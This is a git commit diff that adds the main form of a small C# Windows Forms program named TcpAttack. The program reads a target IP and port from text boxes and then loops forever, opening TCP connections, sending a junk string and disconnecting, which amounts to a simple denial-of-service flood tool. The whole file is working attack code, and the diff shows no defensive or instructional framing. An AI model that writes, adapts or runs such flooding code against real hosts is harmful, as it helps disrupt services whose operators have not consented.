cb5a058c2bcd3274234d1c8697c6e5280f9d1b60
pakerahmet <ahmetpaker18@gmail.com>
2018-04-19 01:03:50 +0300

    Initial commit

---
+++ TcpAttack/TcpAttack/Form1.cs
@@ -0,0 +1,35 @@
+﻿using System;
+using System.Collections.Generic;
+using System.Net;
+using System.Net.Sockets;
+using System.Text;
+using System.Threading;
+using System.Windows.Forms;
+
+namespace TcpAttack
+{
+    public partial class Form1 : Form
+    {
+        public Form1()
+        {
+            InitializeComponent();
+        }
+        private void Start(object sender, EventArgs e)
+        {
+            TcpFlood(textBox1.Text, int.Parse(textBox2.Text));
+        }
+        void TcpFlood(string ip, int port)
+        {
+            while (true)
+            {
+                IPEndPoint remoteEP = new IPEndPoint(IPAddress.Parse(ip), port);
+                Socket sender = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
+                sender.Connect(remoteEP);
+                byte[] msg = Encoding.ASCII.GetBytes("kjafnhkşjagiagkagmaşdg");
+                int bytesSend = sender.Send(msg);
+                sender.Disconnect(true);
+                sender.Close();
+            }
+        }
+    }
+}
